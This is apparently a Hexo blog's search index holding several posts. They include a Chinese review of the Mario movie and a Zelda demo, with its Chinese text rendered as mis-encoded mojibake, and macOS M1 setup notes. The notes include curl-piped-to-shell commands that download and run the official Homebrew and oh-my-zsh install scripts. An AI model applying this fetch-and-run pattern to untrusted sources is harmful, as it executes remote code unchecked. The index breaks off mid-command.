<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/16107/"/>
      <url>/posts/16107/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>408ï¼šæ•°æ®ç»“æ„å¤ä¹ ï¼ˆäºŒï¼‰</title>
      <link href="/posts/32723/"/>
      <url>/posts/32723/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çœ‹é©¬é‡Œå¥¥å¤§ç”µå½±å’Œç‹å›½ä¹‹æ³ªå®æœºæ¼”ç¤ºåçš„éšç¬”</title>
      <link href="/posts/12298/"/>
      <url>/posts/12298/</url>
      
        <content type="html"><![CDATA[<h1 id="é©¬é‡Œå¥¥ç”µå½±"><a href="#é©¬é‡Œå¥¥ç”µå½±" class="headerlink" title="é©¬é‡Œå¥¥ç”µå½±"></a>é©¬é‡Œå¥¥ç”µå½±</h1><h2 id="æ•…äº‹æƒ…èŠ‚"><a href="#æ•…äº‹æƒ…èŠ‚" class="headerlink" title="æ•…äº‹æƒ…èŠ‚"></a>æ•…äº‹æƒ…èŠ‚</h2><p>çœæµå°±æ˜¯ï¼šåº“å·´ä¸ºçˆ±å¾æœä»–å›½ï¼Œå¤ºå–æ— æ•Œæ˜Ÿåªä¸ºæ±‚å©šå…¬ä¸»ï¼Œé©¬é‡Œå¥¥å…„å¼Ÿè¯¯å…¥ä¸–ç•Œä¸å…¬ä¸»ç›¸è¾…ç›¸æˆï¼Œæœ€åæ‰“è´¥åº“å·´æ‹¯æ•‘ä¸–ç•Œã€‚</p><p>éå¸¸ happy ending çš„ç»“å±€ï¼Œç”µå½±ç»“å°¾è¿˜æœ‰å½©è›‹ï¼Œæš—ç¤ºæœ‰ç»­ä½œæˆ–è€…è€ä»»çš„æ¸¸æˆå®‡å®™è®¾å®šã€‚</p><p>æ•…äº‹æƒ…èŠ‚å…¶å®ä¸æ˜¯è¿™éƒ¨ç”µå½±çš„äº®ç‚¹ï¼Œä½†æ˜¯æ‰“ç ´äº†å¸¸è§„çš„åè§ï¼Œä¹Ÿå°±æ˜¯é©¬é‡Œå¥¥æ•‘å…¬ä¸»çš„è®¾å®šã€‚åœ¨ç”µå½±é‡Œä¸€å¼€å§‹å…¬ä¸»å°±è¡¨ç°å¾—è¶³å¤Ÿå¼ºï¼Œåœ¨å†’é™©çš„è¿‡ç¨‹ä¸­ä¹Ÿæ›´ç€é‡äºä¸¤äººçš„ç›¸è¾…ç›¸æˆï¼Œå‰§æƒ…ä¹Ÿä»ä¼ ç»Ÿçš„ç‹å­æ•‘å…¬ä¸»å˜æˆäº†é©¬é‡Œå¥¥æ•‘è·¯æ˜“å‰ï¼Œå…¬ä¸»ä¹Ÿä¸ç¬¦åˆä»¥å¾€å­±å¼±ã€ä»»ç”±é­”ç‹æ‘†å¸ƒï¼Œåªä¼šç­‰äººæ¥æ•‘çš„å½¢è±¡ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å‹‡æ•¢å’Œç‹¬ç«‹ã€‚</p><p>å‰§æƒ…è¿˜æœ‰ä¸€ä¸ªç‚¹æ˜¯æƒ³è¡¨è¾¾åœ¨è¿½é€æ¢¦æƒ³çš„è·¯ä¸Šå—åˆ°å˜²ç¬‘è¦å‹‡äºåæŠ—å’ŒåšæŒç†æƒ³ï¼Œå…·ä½“è¡¨ç°åœ¨é©¬é‡Œå¥¥ä¸¤å…„å¼ŸæŠ›å¼ƒé“é¥­ç¢—ã€èŠ±å…‰ç§¯è“„åšä¸¤äººçš„å¹¿å‘Šç‰‡ä»¥æ­¤è‡ªç«‹é—¨æˆ·è¿™ä»¶äº‹ä¸Šï¼Œå…¶ä¸­è€åŒäº‹å’Œå…„å¼Ÿä¿©çš„çˆ¶æ¯éƒ½ä¸å¤ªçœ‹å¥½ï¼Œç”šè‡³å˜²ç¬‘ä¸¤å…„å¼Ÿã€‚ä¹‹åé©¬é‡Œå¥¥é‡åˆ°äº†æœ‰ç€ç›¸ä¼¼ç»å†çš„å’šå¥‡åˆšï¼Œä¿©äººäº’ç›¸åº”è¯¥ç®— get åˆ°äº†è¿™ä¸ªç‚¹ï¼Œæˆäº†å¥½å…„å¼Ÿï¼Œæœ€åä¸€èµ·å¹¶è‚©ä½œæˆ˜ã€‚</p><h2 id="è¦ç´ é½å…¨"><a href="#è¦ç´ é½å…¨" class="headerlink" title="è¦ç´ é½å…¨"></a>è¦ç´ é½å…¨</h2><p>çœ‹è¿™éƒ¨ç”µå½±çš„æ—¶å€™å…¨ç¨‹æ˜¯ç¬‘ç€çš„ï¼Œå› ä¸ºçœ‹åˆ°äº†å¤ªå¤šå¤ªå¤šç†Ÿæ‚‰çš„ä¸œè¥¿ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šæ°´ç®¡å·¥ã€èƒŒå¸¦è£¤ã€ğŸ„ã€æ”»å‡»èŠ±ã€æ— æ•ŒğŸŒŸã€â“ç®±ã€æ——æ†ã€ä¸‹æ°´é“æ°´ç®¡ï¼Œçˆ†é‡‘å¸ã€é¾Ÿå£³ã€ç« é±¼ã€å¯¼å¼¹ã€é©¬é‡Œå¥¥æ¨ªç‰ˆé—¯å…³ã€é©¬é‡Œå¥¥ 3D é—¯å…³ã€è·¯æ˜“å‰æ´‹é¦†ã€é©¬é‡Œå¥¥å¡ä¸è½¦â€¦</p><p>å¼€åœºå‰æˆ‘è¿˜åœ¨æƒ³è¦ä¸è¦æ‰¾å½©è›‹ï¼Œç»“æœæ ¹æœ¬ä¸ç”¨æ‹…å¿ƒï¼Œæ•´éƒ¨ç”µå½±å…¨æ˜¯å½©è›‹ï¼Œä¸»æ‰“çš„å°±æ˜¯ä¸€ä¸ªè¿˜åŸå’Œè‡´æ•¬ã€‚</p><p>çœ‹å®Œæ¼”ç¤ºæˆ‘çš„æ€ç»ªä¸€ä¸‹å­é£˜åˆ°äº† 8 å²é‚£å¹´ï¼Œæˆ‘ç¬¬ä¸€æ¬¡ç©åˆ°å°éœ¸ç‹ï¼Œåœ¨æ·±å±±è€æ—çš„å®…å­é‡Œï¼Œä¸€ä¸ªå°å°çš„ 2 æ¥¼é˜æ¥¼æ‘†æ”¾ç€ä¸€å°å¤§å±è‚¡ç”µè§†æœºå’Œå°éœ¸ç‹æœºå™¨ã€‚æˆ‘è·Ÿæˆ‘è€çˆ¸ä¸€äººä¸€æ¡å‘½è½®ç€ç©ï¼Œé€šå®µç©ï¼Œä¸¤å¤©å°±é€šå…³äº†æœ€ç»å…¸çš„ã€Šè¶…çº§ç›ä¸½ã€‹ï¼Œä¹‹ååˆç©äº†å…¶ä»–å¾ˆç»å…¸çš„ä½œå“ï¼Œå†åæ¥æˆ‘æ‹æ‹ä¸èˆçš„ç¦»å¼€é‚£ä¸ªåœ°æ–¹ï¼Œå†ä¹Ÿæ²¡æœ‰å›å»è¿‡ã€‚</p><h2 id="éŸ³ä¹é¡¶çº§"><a href="#éŸ³ä¹é¡¶çº§" class="headerlink" title="éŸ³ä¹é¡¶çº§"></a>éŸ³ä¹é¡¶çº§</h2><p>é‚£ä¸ªç»å…¸æ—‹å¾‹ä¸€èµ·æ¥ï¼Œæˆ‘ç›´æ¥å°±æ˜¯æƒ³æ‹¿èµ·æ‰‹æŸ„å¼€å§‹æ“ã€‚å¾ˆå¤šä¸ªåœºæ™¯éƒ½åšäº†æ”¹ç¼–ï¼Œæ”¹ç¼–åè¿˜å¾ˆå®¹æ˜“å¬å‡ºæ¥ï¼Œå¬å‡ºæ¥çš„æ—¶å€™åˆä¼šè§‰å¾—å¾ˆæƒŠå–œï¼Œå°±è¿™æ ·å¾ªç¯æƒŠå–œäº†ä¸€æ•´éƒ¨ç”µå½±ã€‚</p><p>éŸ³ä¹éƒ¨åˆ†è¿˜æ¯”è¾ƒæƒŠå–œçš„æ˜¯ç—…å¨‡åº“å·´çš„é’¢ç´å¼¹å”±ï¼Œåˆæ´—è„‘åˆå¥½å¬ã€‚</p><h1 id="å¡å°”è¾¾ä¼ è¯´ï¼šç‹å›½ä¹‹æ³ªå®æœºæ¼”ç¤º"><a href="#å¡å°”è¾¾ä¼ è¯´ï¼šç‹å›½ä¹‹æ³ªå®æœºæ¼”ç¤º" class="headerlink" title="å¡å°”è¾¾ä¼ è¯´ï¼šç‹å›½ä¹‹æ³ªå®æœºæ¼”ç¤º"></a>å¡å°”è¾¾ä¼ è¯´ï¼šç‹å›½ä¹‹æ³ªå®æœºæ¼”ç¤º</h1><p>çœ‹å®Œå®æœºæ¼”ç¤ºï¼Œæˆ‘çœŸçš„å¾ˆä»–å¦ˆä½©æœä»»å¤©å ‚çš„æƒ³è±¡åŠ›å’Œåˆ›é€ åŠ›ï¼Œåœ¨ switch çš„ç”»é¢ï¼Œæ€§èƒ½éƒ½è½åäºè¿™ä¸ªæ—¶ä»£çš„åŒæ—¶ï¼Œä»»å¤©å ‚æ²¡æœ‰åšç½‘æ¸¸ï¼Œæ²¡æœ‰åšå†…è´­ï¼Œæ²¡æœ‰åšå……å€¼ç³»ç»Ÿï¼Œæ²¡æœ‰åšç”µç«ï¼Œä¹Ÿæ²¡æœ‰èŠ±é’±åšå®£å‘æäºŒåˆ›ï¼Œè€Œæ˜¯è€è€å®å®çš„æŠŠè‡ªå·±çš„ä½œå“æ‰“ç£¨åˆ°æè‡´ã€‚</p><p>ç‹å›½ä¹‹æ³ªæ¼”ç¤ºé‡Œå‡ºç°äº†å¤ªå¤šæƒŠè‰³åˆ°æˆ‘çš„ä¸œè¥¿ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼šæ›´å¤§ã€æ›´ç«‹ä½“çš„å¤§ä¸–ç•Œæ¢ç´¢ï¼Œèƒ½ä»ç©ºå²›é«˜ç©ºç›´æ¥è·³ä¼ï¼Œéšå¤„å¯è§çš„ææ–™ç«Ÿç„¶èƒ½å¤Ÿè‡ªç”±ç»„è£…å‡ºä»»ä½•è½½å…·ï¼Œè¿˜æœ‰æœ€æœ€æƒŠè‰³çš„æ ‘ææ’çŸ³å¤´ã€‚æŠŠæ ‘æä¸Šç²˜ä¸ŠçŸ³å¤´å°±æ˜¯æ›´å¼ºçš„æ­¦å™¨ï¼Œé€ èˆ¹å°±æ˜¯æŠŠå‡ ä¸ªæ ‘å¹²ç²˜åœ¨ä¸€èµ·ï¼Œè¿™äº›éƒ½æ˜¯æ¯ä¸ªå­©å­éƒ½æ‡‚çš„é“ç†ï¼Œä½†ä¹Ÿæ˜¯æ¯ä¸ªå­©å­åœ¨æˆé•¿çš„æ—¶å€™ä¸¢å¤±çš„ç‘°å®ã€‚</p><p>è¿™ä¸€éƒ¨å¡å°”è¾¾æˆ‘ä¸€å®šä¸ä¼šå»â˜ï¸ï¼Œæˆ‘ä¼šä¹°å¥½å¡å¸¦ï¼Œåœ¨ä»Šå¹´è€ƒå®Œç ”åè‡ªå·±å¼€è’è¿™éƒ¨ä½œå“ï¼Œæ‰¾å›æˆ‘çš„ç«¥å¿ƒï¼Œæ²»å¥½æˆ‘çš„ç”µå­ywã€‚</p><p>æˆ‘æƒ³ï¼Œå¦‚æœæˆ‘å†å¹´è½»åå²ï¼Œæ—·é‡ä¹‹æ¯å’Œç‹å›½ä¹‹æ³ªå†åŠ ä¸Šé©¬é‡Œå¥¥ç³»åˆ—çœŸçš„è¶³å¤Ÿæˆ‘çˆ½ç©ä¸€æ•´ä¸ªç«¥å¹´ï¼Œå› ä¸ºæ‰€æœ‰ç©ºå¹»çš„æ¢¦éƒ½åœ¨é‡Œé¢å®ç°ï¼Œå°±å¥½åƒè¢«äººå¡äº†ä¸€ä¸ªåŒ…è£¹åˆ°æ‰‹å†™ç€ï¼šâ€œæ‰“å¼€å§ï¼Œé‡Œé¢æ˜¯ä½ çš„ç«¥å¹´ã€‚â€</p>]]></content>
      
      
      <categories>
          
          <category> è¯»åæ„Ÿå’Œè§‚åæ„Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§‚åæ„Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macos M1 Ventura 13.3 ç¯å¢ƒé…ç½®è®°å½•</title>
      <link href="/posts/45933/"/>
      <url>/posts/45933/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>ä¹‹å‰å°å­©å­ä¸æ‡‚äº‹ï¼Œä¹±é…è¿™å° M1 mac mini çš„ç¯å¢ƒï¼Œé…å¾—ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œæˆ‘åˆæœ‰ç¯å¢ƒæ´ç™–ï¼Œæ‰€ä»¥é‡ç½®äº†é‡æ–°é…ï¼Œç•™ä¸ªè®°å½•åšå­˜æ¡£ã€‚</p></blockquote><h1 id="ClashX-Pro"><a href="#ClashX-Pro" class="headerlink" title="ClashX Pro"></a>ClashX Pro</h1><p>ä¸å¤ªæ¸…æ¥šè¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯éå¸¸é‡è¦ï¼Œç•¥ã€‚</p><h1 id="Homebrew-å®‰è£…ä¸é…ç½®"><a href="#Homebrew-å®‰è£…ä¸é…ç½®" class="headerlink" title="Homebrew å®‰è£…ä¸é…ç½®"></a>Homebrew å®‰è£…ä¸é…ç½®</h1><p>ä¸€ä¸ªè½¯ä»¶åŒ…ç®¡ç†ç³»ç»Ÿï¼Œç±»ä¼¼äº Ubuntu çš„ apt-getï¼Œå¯ä»¥ç”¨æ¥å®‰è£…ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®‰è£…è½¯ä»¶ã€‚</p><p>ç»ˆç«¯æ²¡æœ‰èµ°ä»£ç†ï¼Œæ‰€ä»¥éœ€è¦è®©ç»ˆç«¯èµ°ä»£ç†çš„ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ClashX ä»£ç†ç¤ºä¾‹</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·¯å¾„é…ç½®ï¼Œå®‰è£…å¥½ä¹‹åä¼šæç¤ºç±»ä¼¼çš„å‘½ä»¤ï¼Œå¤åˆ¶ç²˜è´´å³å¯</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;</span> &gt;&gt; /Users/your_user_name/.zprofile</span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(/opt/homebrew/bin/brew shellenv)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>å¸¸ç”¨å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–° Homebrew</span></span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢ç›¸å…³çš„åŒ…</span></span><br><span class="line">brew search [å…³é”®è¯] </span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ Homebrew ç›¸å…³è·¯å¾„</span></span><br><span class="line">brew --cache    <span class="comment"># ä¸‹è½½ç¼“å­˜è·¯å¾„</span></span><br><span class="line">brew --prefix   <span class="comment"># å®‰è£…ç›®å½•ï¼Œé€šå¸¸æ˜¯è¯¥è·¯å¾„çš„ Cellar ç›®å½•ä¸‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åŒ…çš„ä¿¡æ¯</span></span><br><span class="line">brew info [è½¯ä»¶å]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># æŸ¥çœ‹å·²å®‰è£…çš„åŒ…</span></span><br><span class="line">brew list             <span class="comment"># æ‰€æœ‰çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬ Formulae  å’Œ Cask</span></span><br><span class="line">brew list --formulae  <span class="comment"># æ‰€æœ‰å·²å®‰è£…çš„ Formulae</span></span><br><span class="line">brew list --cask      <span class="comment"># æ‰€æœ‰å·²å®‰è£…çš„ Casks</span></span><br><span class="line">brew list &lt;package&gt;   <span class="comment"># åˆ—ä¸¾æŸä¸ª Formulate æˆ– Cask çš„è¯¦ç»†è·¯å¾„</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—å‡ºå¯æ›´æ–°çš„è½¯ä»¶</span></span><br><span class="line">brew outdated</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°æŸä¸ªè½¯ä»¶</span></span><br><span class="line">brew upgrade              <span class="comment"># æ›´æ–°æ‰€æœ‰</span></span><br><span class="line">brew upgrade &lt;package&gt;    <span class="comment"># æ›´æ–°æŒ‡å®šè½¯ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸…ç†æ‰€æœ‰è½¯ä»¶çš„æ—§ç‰ˆ</span></span><br><span class="line">brew cleanup</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸è½½æŸä¸ªè½¯ä»¶</span></span><br><span class="line">brew uninstall [è½¯ä»¶å]</span><br><span class="line">brew uninstall --force<span class="comment"># å¼ºåˆ¶å¸è½½</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰æœåŠ¡ </span></span><br><span class="line">brew services listï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment"># å•æ¬¡è¿è¡ŒæŸä¸ªæœåŠ¡</span></span><br><span class="line">brew services run [æœåŠ¡å]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡ŒæŸä¸ªæœåŠ¡ï¼Œå¹¶è®¾ç½®å¼€æœºè‡ªåŠ¨è¿è¡Œ</span></span><br><span class="line">brew services start [æœåŠ¡å]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœæ­¢æŸä¸ªæœåŠ¡</span></span><br><span class="line">brew services stop [æœåŠ¡å]</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯æŸä¸ªæœåŠ¡</span></span><br><span class="line">brew services restart</span><br></pre></td></tr></table></figure><p>Homebrew cask install å’Œæ™®é€š install åŒºåˆ«ï¼š</p><p>Homebrew Cask å…ˆä¸‹è½½è½¯ä»¶åè§£å‹åˆ°ç»Ÿä¸€çš„ç›®å½•ä¸­ï¼ˆ<code>/opt/homebrew-cask/Caskroom</code>ï¼‰ï¼Œç„¶åå†è½¯é“¾åˆ° <code>~/Applications/</code> ç›®å½•ä¸‹ï¼Œçœæ‰äº†è‡ªå·±ä¸‹è½½ã€è§£å‹ã€æ‹–æ‹½å®‰è£…ç­‰æ­¥éª¤ï¼ŒåŒæ ·çš„ï¼Œå¸è½½ç›¸å½“ç®€å•å’Œå¹²å‡€ï¼Œä¸€å¥å‘½ä»¤å°±å¯ä»¥å®Œæˆã€‚</p><p>å®‰è£… Homebrew cask ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install cask</span><br></pre></td></tr></table></figure><p>æ›´æ–° Homebrew Cask å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew update &amp;&amp; brew upgrade brew-cask &amp;&amp; brew cleanup</span><br></pre></td></tr></table></figure><p>HomeBrew Cask æ²¡æœ‰æ›´æ–°è½¯ä»¶çš„å‘½ä»¤ï¼Œæ‰€ä»¥å¦‚æœè¦æ›´æ–°è½¯ä»¶å¾—å…ˆå¸è½½å†å®‰è£…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask uninstall APP &amp;&amp; brew cask install APP</span><br></pre></td></tr></table></figure><h2 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HOMEBREW_BREW_GIT_REMOTE=<span class="string">&quot;https://mirrors.ustc.edu.cn/brew.git&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BREW_GIT_REMOTE=&quot;https://mirrors.ustc.edu.cn/brew.git&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">export</span> HOMEBREW_CORE_GIT_REMOTE=<span class="string">&quot;https://mirrors.ustc.edu.cn/homebrew-core.git&quot;</span></span><br><span class="line"><span class="built_in">export</span> HOMEBREW_BOTTLE_DOMAIN=<span class="string">&quot;https://mirrors.ustc.edu.cn/homebrew-bottles&quot;</span></span><br><span class="line"><span class="built_in">export</span> HOMEBREW_API_DOMAIN=<span class="string">&quot;https://mirrors.ustc.edu.cn/homebrew-bottles/api&quot;</span></span><br><span class="line"></span><br><span class="line">brew update</span><br></pre></td></tr></table></figure><p>é‡ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HOMEBREW_BREW_GIT_REMOTE</span><br><span class="line">git -C <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span> remote set-url origin https://github.com/Homebrew/brew</span><br><span class="line">git -C <span class="string">&quot;<span class="subst">$(brew --repo homebrew/core)</span>&quot;</span> remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">brew update</span><br></pre></td></tr></table></figure><h1 id="ç³»ç»Ÿè®¾ç½®"><a href="#ç³»ç»Ÿè®¾ç½®" class="headerlink" title="ç³»ç»Ÿè®¾ç½®"></a>ç³»ç»Ÿè®¾ç½®</h1><h2 id="Xcode-Command-Line-Tools"><a href="#Xcode-Command-Line-Tools" class="headerlink" title="Xcode Command Line Tools"></a>Xcode Command Line Tools</h2><p>æ‰“å¼€ç»ˆç«¯è¾“å…¥å‘½ä»¤å°±ä¼šæç¤ºå®‰è£…ï¼Œå¦‚æœæ²¡æœ‰æç¤ºå¯ä»¥åœ¨ç»ˆç«¯å†…ç”¨å‘½ä»¤å®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcode-select --install</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹å¯åŠ¨å°è¡Œåˆ—æ•°"><a href="#ä¿®æ”¹å¯åŠ¨å°è¡Œåˆ—æ•°" class="headerlink" title="ä¿®æ”¹å¯åŠ¨å°è¡Œåˆ—æ•°"></a>ä¿®æ”¹å¯åŠ¨å°è¡Œåˆ—æ•°</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®åˆ—æ•°ä¸º 9</span></span><br><span class="line">defaults write com.apple.dock springboard-columns -int 9</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è¡Œæ•°ä¸º 6</span></span><br><span class="line">defaults write com.apple.dock springboard-rows -int 6</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ Dock ç”Ÿæ•ˆ</span></span><br><span class="line">killall Dock</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤é»˜è®¤çš„åˆ—æ•°å’Œè¡Œæ•°</span></span><br><span class="line">defaults write com.apple.dock springboard-rows Default</span><br><span class="line">defaults write com.apple.dock springboard-columns Default</span><br></pre></td></tr></table></figure><h2 id="ç»ˆç«¯é…ç½®"><a href="#ç»ˆç«¯é…ç½®" class="headerlink" title="ç»ˆç«¯é…ç½®"></a>ç»ˆç«¯é…ç½®</h2><h3 id="iTerm2"><a href="#iTerm2" class="headerlink" title="iTerm2"></a>iTerm2</h3><p>ç»ˆç«¯å·¥å…·ï¼Œæ”¯æŒä¸»é¢˜é…ç½®ã€æ™ºèƒ½æç¤ºã€å†å²è®°å½•ç­‰ç­‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install --cask iterm2</span><br></pre></td></tr></table></figure><p>é…ç½®ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404154035755.png" alt="image-20230404154035755"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404154108840.png" alt="image-20230404154108840"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404154153957.png" alt="image-20230404154153957"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404154242371.png" alt="image-20230404154242371"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404154550033.png" alt="image-20230404154550033"></p><h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p>ç”¨äºç®¡ç† <code>zsh</code> çš„é…ç½®ï¼Œzsh çš„ç¾åŒ–å¢å¼ºè„šæœ¬ï¼Œå¯ä»¥æŠŠç»ˆç«¯æå¾—èŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›¸å…³é…ç½®å­˜å‚¨åœ¨ <code>~/.zshrc</code>ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>æ’ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> 